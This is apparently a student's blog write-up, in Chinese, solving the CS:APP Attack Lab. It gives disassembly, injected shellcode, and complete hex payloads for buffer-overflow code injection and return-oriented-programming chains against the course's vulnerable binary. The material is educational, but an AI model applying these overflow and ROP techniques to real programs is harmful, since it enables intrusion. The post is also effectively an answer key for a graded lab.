+++
date = '2025-03-20T15:49:11+08:00'
draft = false
title = 'CSAPP:AttackLab'

+++

> 本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。

# CSAPP:AttackLab

> [!WARNING]
>
> 1. 通过本实验，你将学习到利用安全性漏洞攻击操作系统和网络服务器的方法。本实验的目的是通过模拟攻击来增进对安全漏洞的理解和防范意识，了解安全漏洞的本质。本实验内容应仅用于学习目的，严禁用于任何非法或不道德的活动。
> 2. 本实验开始前，需要学习CS:APP3e第3.10.3节和第3.10.4节的知识。
> 3. https://arthals.ink/blog/attack-lab 你还是可以参考这位的博客。

```shell
scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scp下载远程服务器上的文件，如果要本地开发这是好的办法
```

前三层是CI（代码注入攻击）攻击，后两层是ROP（返回导向编程）攻击。

## 代码注入攻击（Code Injection Attacks）

## phase1:

```asm
0000000000401a90 <test>:
  401a90:	48 83 ec 08          	sub    $0x8,%rsp ; 分配了八个字节的空间
  401a94:	b8 00 00 00 00       	mov    $0x0,%eax
  401a99:	e8 31 fe ff ff       	call   4018cf <getbuf> ; 调用了getbuf函数
  401a9e:	89 c2                	mov    %eax,%edx
  401aa0:	be e8 31 40 00       	mov    $0x4031e8,%esi
  401aa5:	bf 01 00 00 00       	mov    $0x1,%edi
  401aaa:	b8 00 00 00 00       	mov    $0x0,%eax
  401aaf:	e8 3c f2 ff ff       	call   400cf0 <__printf_chk@plt>
  401ab4:	48 83 c4 08          	add    $0x8,%rsp
  401ab8:	c3                   	ret    
```

```asm
00000000004018cf <getbuf>:
  4018cf:	48 83 ec 38          	sub    $0x38,%rsp ; 分配了56个字节的空间（在buf里）
  4018d3:	48 89 e7             	mov    %rsp,%rdi
  4018d6:	e8 7e 02 00 00       	call   401b59 <Gets>
  4018db:	b8 01 00 00 00       	mov    $0x1,%eax
  4018e0:	48 83 c4 38          	add    $0x38,%rsp
  4018e4:	c3                   	ret    
```

```asm
00000000004018e5 <touch1>:
  4018e5:	48 83 ec 08          	sub    $0x8,%rsp
  4018e9:	c7 05 2d 2c 20 00 01 	movl   $0x1,0x202c2d(%rip)        # 604520 <vlevel>
  4018f0:	00 00 00 
  4018f3:	bf 22 31 40 00       	mov    $0x403122,%edi
  4018f8:	e8 53 f4 ff ff       	call   400d50 <puts@plt>
  4018fd:	bf 01 00 00 00       	mov    $0x1,%edi
  401902:	e8 92 03 00 00       	call   401c99 <validate>
  401907:	bf 00 00 00 00       	mov    $0x0,%edi
  40190c:	e8 bf f5 ff ff       	call   400ed0 <exit@plt>
```

我要把return的地址覆盖成上面的touch1函数的首地址以执行touch1函数。

那么直接构造如下的输入字符串即可，记得使用hex2raw工具。

```asm
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
e5 18 40 00
```

## phase2:

这里的操作就是：1.同理覆盖地址。2.你要传一个参数来执行你的代码。

我要把覆盖的地址变成touch2,同时要传参数。

```asm
0000000000401911 <touch2>:
  401911:	48 83 ec 08          	sub    $0x8,%rsp
  401915:	89 fa                	mov    %edi,%edx
  401917:	c7 05 ff 2b 20 00 02 	movl   $0x2,0x202bff(%rip)        # 604520 <vlevel>
  40191e:	00 00 00 
  401921:	39 3d 01 2c 20 00    	cmp    %edi,0x202c01(%rip)        # 604528 <cookie>
  401927:	75 20                	jne    401949 <touch2+0x38>
  401929:	be 48 31 40 00       	mov    $0x403148,%esi
  40192e:	bf 01 00 00 00       	mov    $0x1,%edi
  401933:	b8 00 00 00 00       	mov    $0x0,%eax
  401938:	e8 b3 f3 ff ff       	call   400cf0 <__printf_chk@plt>
  40193d:	bf 02 00 00 00       	mov    $0x2,%edi
  401942:	e8 52 03 00 00       	call   401c99 <validate>
  401947:	eb 1e                	jmp    401967 <touch2+0x56>
  401949:	be 70 31 40 00       	mov    $0x403170,%esi
  40194e:	bf 01 00 00 00       	mov    $0x1,%edi
  401953:	b8 00 00 00 00       	mov    $0x0,%eax
  401958:	e8 93 f3 ff ff       	call   400cf0 <__printf_chk@plt>
  40195d:	bf 02 00 00 00       	mov    $0x2,%edi
  401962:	e8 f4 03 00 00       	call   401d5b <fail>
  401967:	bf 00 00 00 00       	mov    $0x0,%edi
  40196c:	e8 5f f5 ff ff       	call   400ed0 <exit@plt>
```

过程：覆盖调用函数的返回地址来执行我的代码（这相当于是在stack上执行我的代码，你想这要怎么做到？把ret要覆盖的地址设置成分配之后的rsp的值，那么rip便会从这里开始执行代码，我们再将代码放进缓冲区，好妙的攻击技巧），我的代码把%rdi设置成我的cookie值，并且通过ret指令返回到touch2函数执行。

在getbuf分配完了栈空间之后，%rsp = 0x5563c8d8,这也就是缓冲区的起始地址。

我们构造：

```asm
movq $0x14e6646f,%rdi ; 把第一个参数设置成cookie值
pushq $0x00401911 ; 这里push进去一个touch2的首地址值
ret ; ret实际上就是把刚刚push进去的值拿出来然后跳转执行
// gcc -c asm.s
// objdump -d asm.o > asm.byte 我们拿到这段汇编指令的字节码
```

## phase3:

还是传参，但是会更麻烦，要调用更多的函数来解决这个问题,我要把我的cookie值作为一个string传给touch3。

```asm
0000000000401971 <hexmatch>:
  401971:	41 54                	push   %r12
  401973:	55                   	push   %rbp
  401974:	53                   	push   %rbx
  401975:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  401979:	89 fd                	mov    %edi,%ebp
  40197b:	48 89 f3             	mov    %rsi,%rbx
  40197e:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401985:	00 00 
  401987:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  40198c:	31 c0                	xor    %eax,%eax
  40198e:	e8 bd f4 ff ff       	call   400e50 <random@plt>
  401993:	48 89 c1             	mov    %rax,%rcx
  401996:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  40199d:	0a d7 a3 
  4019a0:	48 f7 ea             	imul   %rdx
  4019a3:	48 01 ca             	add    %rcx,%rdx
  4019a6:	48 c1 fa 06          	sar    $0x6,%rdx
  4019aa:	48 89 c8             	mov    %rcx,%rax
  4019ad:	48 c1 f8 3f          	sar    $0x3f,%rax
  4019b1:	48 29 c2             	sub    %rax,%rdx
  4019b4:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  4019b8:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
  4019bc:	48 8d 04 95 00 00 00 	lea    0x0(,%rdx,4),%rax
  4019c3:	00 
  4019c4:	48 29 c1             	sub    %rax,%rcx
  4019c7:	4c 8d 24 0c          	lea    (%rsp,%rcx,1),%r12
  4019cb:	41 89 e8             	mov    %ebp,%r8d
  4019ce:	b9 3f 31 40 00       	mov    $0x40313f,%ecx
  4019d3:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4019da:	be 01 00 00 00       	mov    $0x1,%esi
  4019df:	4c 89 e7             	mov    %r12,%rdi
  4019e2:	b8 00 00 00 00       	mov    $0x0,%eax
  4019e7:	e8 44 f4 ff ff       	call   400e30 <__sprintf_chk@plt>
  4019ec:	ba 09 00 00 00       	mov    $0x9,%edx
  4019f1:	4c 89 e6             	mov    %r12,%rsi
  4019f4:	48 89 df             	mov    %rbx,%rdi
  4019f7:	e8 34 f3 ff ff       	call   400d30 <strncmp@plt>
  4019fc:	85 c0                	test   %eax,%eax
  4019fe:	0f 94 c0             	sete   %al
  401a01:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
  401a06:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  401a0d:	00 00 
  401a0f:	74 05                	je     401a16 <hexmatch+0xa5>
  401a11:	e8 5a f3 ff ff       	call   400d70 <__stack_chk_fail@plt>
  401a16:	0f b6 c0             	movzbl %al,%eax
  401a19:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  401a1d:	5b                   	pop    %rbx
  401a1e:	5d                   	pop    %rbp
  401a1f:	41 5c                	pop    %r12
  401a21:	c3                   	ret    

0000000000401a22 <touch3>:
  401a22:	53                   	push   %rbx
  401a23:	48 89 fb             	mov    %rdi,%rbx
  401a26:	c7 05 f0 2a 20 00 03 	movl   $0x3,0x202af0(%rip)        # 604520 <vlevel>
  401a2d:	00 00 00 
  401a30:	48 89 fe             	mov    %rdi,%rsi
  401a33:	8b 3d ef 2a 20 00    	mov    0x202aef(%rip),%edi        # 604528 <cookie>
  401a39:	e8 33 ff ff ff       	call   401971 <hexmatch>
  401a3e:	85 c0                	test   %eax,%eax
  401a40:	74 23                	je     401a65 <touch3+0x43>
  401a42:	48 89 da             	mov    %rbx,%rdx
  401a45:	be 98 31 40 00       	mov    $0x403198,%esi
  401a4a:	bf 01 00 00 00       	mov    $0x1,%edi
  401a4f:	b8 00 00 00 00       	mov    $0x0,%eax
  401a54:	e8 97 f2 ff ff       	call   400cf0 <__printf_chk@plt>
  401a59:	bf 03 00 00 00       	mov    $0x3,%edi
  401a5e:	e8 36 02 00 00       	call   401c99 <validate>
  401a63:	eb 21                	jmp    401a86 <touch3+0x64>
  401a65:	48 89 da             	mov    %rbx,%rdx
  401a68:	be c0 31 40 00       	mov    $0x4031c0,%esi
  401a6d:	bf 01 00 00 00       	mov    $0x1,%edi
  401a72:	b8 00 00 00 00       	mov    $0x0,%eax
  401a77:	e8 74 f2 ff ff       	call   400cf0 <__printf_chk@plt>
  401a7c:	bf 03 00 00 00       	mov    $0x3,%edi
  401a81:	e8 d5 02 00 00       	call   401d5b <fail>
  401a86:	bf 00 00 00 00       	mov    $0x0,%edi
  401a8b:	e8 40 f4 ff ff       	call   400ed0 <exit@plt>

```

这是上面两个函数的C语言源代码：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;	//这里随机分配可能导致的结果是把我们注入的字符串覆盖掉
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

gdb调试（先跟第二层一样跳转到touch3）：

先查看进入hexmatch之前的缓冲区，我们注入的代码还在（未使用的部分用3f填充）

![image-20250319155321094](/img/image-20250319155321094.png)

在进入了之后（我们发现有一部分已经被覆盖，但是没有威胁到我们的代码，所以这只是概率事件）：

![image-20250319155627424](/img/image-20250319155627424.png)

看起来28这里一直都是0,我们尝试把字符数组放在这里：

```asm
man ascii //查看关于ascii的帮助
```

![image-20250319160631318](/img/image-20250319160631318.png)

cookie--->ascii

0x14e6646f--->31 34 65 36 36 34 36 66

担心出错，再检查一遍：

![image-20250319162535823](/img/image-20250319162535823.png)

> 在更改的时候还要注意：不仅留心小端顺序，还要保证原来调用的函数的参数的值没有发生变化。
>
> Q：不知道为什么，28的位置写不进去，后面改成18的位置再重新写进去（记得更改rdi指向的地址，假如你错了的话）。

## 返回导向编程（Return-oriented Programming）

## phase4:

> 在前面的情况下，我们都没有启用栈随机化和栈执行保护（在栈上执行代码本来就是一件很可疑的事情），那么就来了这种攻击方式。
>
> 它要解决的还是上面的phase2和phase3的问题。
>
> 这种攻击方式的思路就是说，我们不在栈上执行我们的代码，在它自己本身就有的代码里面挑挑拣拣来达到我们的目的，并且每次执行的指令后面都有c3这样就能不停的继续调用下去。

### 汇编指令的相关字节码：

![attacklab_bytecoding_instructions.png](/img/attacklab_bytecoding_instructions.png)

### 这是它给我们的gadget表：

```asm
0000000000401ab9 <start_farm>:
  401ab9:	b8 01 00 00 00       	mov    $0x1,%eax
  401abe:	c3                   	ret    

0000000000401abf <addval_480>:
  401abf:	8d 87 6e a5 58 c3    	lea    -0x3ca75a92(%rdi),%eax ;2.3 58 c3 popq %rax (401ac3) ---1.1把rax设置成cookie的值
  401ac5:	c3                   	ret    						  ; 就是这里，愚蠢的我一直把这里数错了导致几个小时没看出来为什么有segmentaion fault

0000000000401ac6 <getval_188>:
  401ac6:	b8 c8 89 c7 90       	mov    $0x90c789c8,%eax
  401acb:	c3                   	ret    

0000000000401acc <addval_392>:
  401acc:	8d 87 58 91 c3 9e    	lea    -0x613c6ea8(%rdi),%eax
  401ad2:	c3                   	ret    

0000000000401ad3 <addval_406>:
  401ad3:	8d 87 ec ad d8 c3    	lea    -0x3c275214(%rdi),%eax
  401ad9:	c3                   	ret    

0000000000401ada <getval_227>:
  401ada:	b8 65 48 89 c7       	mov    $0xc7894865,%eax ; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2把rdi设置成cookie值
  401adf:	c3                   	ret    

0000000000401ae0 <getval_437>:
  401ae0:	b8 49 89 c7 90       	mov    $0x90c78949,%eax
  401ae5:	c3                   	ret    

0000000000401ae6 <setval_348>:
  401ae6:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  401aec:	c3                   	ret    

0000000000401aed <setval_136>:
  401aed:	c7 07 58 90 90 90    	movl   $0x90909058,(%rdi)
  401af3:	c3                   	ret    

0000000000401af4 <mid_farm>:
  401af4:	b8 01 00 00 00       	mov    $0x1,%eax
  401af9:	c3                   	ret    

0000000000401afa <add_xy>:
  401afa:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax ; 2.7(401afa) 这里就是直接设计好的
  401afe:	c3                   	ret    

0000000000401aff <getval_314>:
  401aff:	b8 a9 c9 d6 90       	mov    $0x90d6c9a9,%eax
  401b04:	c3                   	ret    

0000000000401b05 <addval_442>:
  401b05:	8d 87 48 09 e0 90    	lea    -0x6f1ff6b8(%rdi),%eax
  401b0b:	c3                   	ret    

0000000000401b0c <addval_139>:
  401b0c:	8d 87 89 ca 90 90    	lea    -0x6f6f3577(%rdi),%eax
  401b12:	c3                   	ret    

0000000000401b13 <addval_491>:
  401b13:	8d 87 1f 4b 89 d6    	lea    -0x2976b4e1(%rdi),%eax ; 2.6(401b17) mov    %edx,%esi
  401b19:	c3                   	ret    

0000000000401b1a <setval_367>:
  401b1a:	c7 07 bb 48 89 e0    	movl   $0xe08948bb,(%rdi) ; 2.1(401b1d) mov    %rsp,%rax
  401b20:	c3                   	ret    

0000000000401b21 <getval_215>:
  401b21:	b8 48 89 e0 c1       	mov    $0xc1e08948,%eax
  401b26:	c3                   	ret    

0000000000401b27 <setval_192>:
  401b27:	c7 07 89 c1 92 90    	movl   $0x9092c189,(%rdi)
  401b2d:	c3                   	ret    

0000000000401b2e <getval_418>:
  401b2e:	b8 89 ca 84 c0       	mov    $0xc084ca89,%eax ;2.5(401b2f) mov    %ecx,%edx test   %al,%al
  401b33:	c3                   	ret    

0000000000401b34 <addval_318>:
  401b34:	8d 87 8b d6 84 c0    	lea    -0x3f7b2975(%rdi),%eax
  401b3a:	c3                   	ret    

0000000000401b3b <setval_167>:
  401b3b:	c7 07 48 89 e0 94    	movl   $0x94e08948,(%rdi)
  401b41:	c3                   	ret    

0000000000401b42 <setval_410>:
  401b42:	c7 07 df 89 ca 91    	movl   $0x91ca89df,(%rdi)
  401b48:	c3                   	ret    

0000000000401b49 <setval_408>:
  401b49:	c7 07 95 48 81 e0    	movl   $0xe0814895,(%rdi)
  401b4f:	c3                   	ret    

0000000000401b50 <setval_115>:
  401b50:	c7 07 88 d6 90 c3    	movl   $0xc390d688,(%rdi)
  401b56:	c3                   	ret    

0000000000401b57 <setval_336>:
  401b57:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401b5d:	c3                   	ret    

0000000000401b5e <addval_315>:
  401b5e:	8d 87 89 c1 a4 c0    	lea    -0x3f5b3e77(%rdi),%eax
  401b64:	c3                   	ret    

0000000000401b65 <setval_400>:
  401b65:	c7 07 89 ca 28 d2    	movl   $0xd228ca89,(%rdi)
  401b6b:	c3                   	ret    

0000000000401b6c <getval_226>:
  401b6c:	b8 88 d6 38 c0       	mov    $0xc038d688,%eax
  401b71:	c3                   	ret    

0000000000401b72 <getval_388>:
  401b72:	b8 c9 c1 20 c9       	mov    $0xc920c1c9,%eax ; (401b75)
  401b77:	c3                   	ret    

0000000000401b78 <getval_379>:
  401b78:	b8 68 89 e0 c3       	mov    $0xc3e08968,%eax
  401b7d:	c3                   	ret    

0000000000401b7e <getval_495>:
  401b7e:	b8 89 d6 92 c3       	mov    $0xc392d689,%eax
  401b83:	c3                   	ret    

0000000000401b84 <addval_434>:
  401b84:	8d 87 89 ca 28 d2    	lea    -0x2dd73577(%rdi),%eax
  401b8a:	c3                   	ret    

0000000000401b8b <getval_382>:
  401b8b:	b8 4c 89 e0 c3       	mov    $0xc3e0894c,%eax
  401b90:	c3                   	ret    

0000000000401b91 <addval_100>:
  401b91:	8d 87 c9 c1 84 c9    	lea    -0x367b3e37(%rdi),%eax
  401b97:	c3                   	ret    

0000000000401b98 <setval_140>:
  401b98:	c7 07 f8 8b c1 c3    	movl   $0xc3c18bf8,(%rdi)
  401b9e:	c3                   	ret    

0000000000401b9f <setval_104>:
  401b9f:	c7 07 88 c1 84 c0    	movl   $0xc084c188,(%rdi)
  401ba5:	c3                   	ret    

0000000000401ba6 <addval_125>:
  401ba6:	8d 87 89 d6 90 c3    	lea    -0x3c6f2977(%rdi),%eax
  401bac:	c3                   	ret    

0000000000401bad <getval_111>:
  401bad:	b8 16 a9 09 ca       	mov    $0xca09a916,%eax
  401bb2:	c3                   	ret    

0000000000401bb3 <getval_256>:
  401bb3:	b8 a9 ca 20 db       	mov    $0xdb20caa9,%eax
  401bb8:	c3                   	ret    

0000000000401bb9 <getval_170>:
  401bb9:	b8 89 c1 08 d2       	mov    $0xd208c189,%eax
  401bbe:	c3                   	ret    

0000000000401bbf <setval_102>:
  401bbf:	c7 07 0e 89 c1 c3    	movl   $0xc3c1890e,(%rdi) ; 2.4(401bc2) mov    %eax,%ecx
  401bc5:	c3                   	ret    

0000000000401bc6 <getval_364>:
  401bc6:	b8 81 d6 90 90       	mov    $0x9090d681,%eax
  401bcb:	c3                   	ret    

0000000000401bcc <setval_159>:
  401bcc:	c7 07 89 ca c1 ce    	movl   $0xcec1ca89,(%rdi)
  401bd2:	c3                   	ret    

0000000000401bd3 <end_farm>:
  401bd3:	b8 01 00 00 00       	mov    $0x1,%eax
  401bd8:	c3                   	ret    
```

那么我们输入的字节码如下：

```asm
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c3 1a 40 00 00 00 00 00 
6f 64 e6 14 00 00 00 00 
dc 1a 40 00 00 00 00 00 
11 19 40 00 00 00 00 00 
```

> 一定要把地址数清楚孩子们，因为有一个地址我没有数清楚而浪费了很长时间，不过解决段错误也是一种学习。（很难蚌的住啊）

## phase5:

> 据说这是最难的一层，不过既然已经接触了汇编语言，那还是来试试看！
>
> 解题思路来自于上面的Blog，在栈随机化的情况下，把rsp指针作为一个参考点来找到我们需要的参数。

设计的asm：

```asm
phase5.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 89 e0             	mov    %rsp,%rax
   3:	c3                   	ret    
   4:	48 89 c7             	mov    %rax,%rdi
   7:	c3                   	ret    
   8:	58                   	pop    %rax
   9:	90                   	nop
   a:	c3                   	ret    
   b:	89 c1                	mov    %eax,%ecx
   d:	90                   	nop
   e:	c3                   	ret    
   f:	89 ca                	mov    %ecx,%edx
  11:	84 c0                	test   %al,%al
  13:	c3                   	ret    
  14:	89 d6                	mov    %edx,%esi
  16:	20 d2                	and    %dl,%dl
  18:	c3                   	ret    
  19:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  1d:	48 89 c7             	mov    %rax,%rdi
  20:	c3                   	ret    

```

```asm
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
1d 1b 40 00 00 00 00 00 
dc 1a 40 00 00 00 00 00 
c3 1a 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
c2 1b 40 00 00 00 00 00 
2f 1b 40 00 00 00 00 00 
17 1b 40 00 00 00 00 00 
fa 1a 40 00 00 00 00 00 
dc 1a 40 00 00 00 00 00 
22 1a 40 00 00 00 00 00 
31 34 65 36 36 34 36 66 
00 00 00 00 00 00 00 00 
```

大功告成！！！抄别人写的就是简单啊（），如果说有难度，那其实在于你要写一串没有bug的汇编然后去找，但是看别人的就不难了（？）。
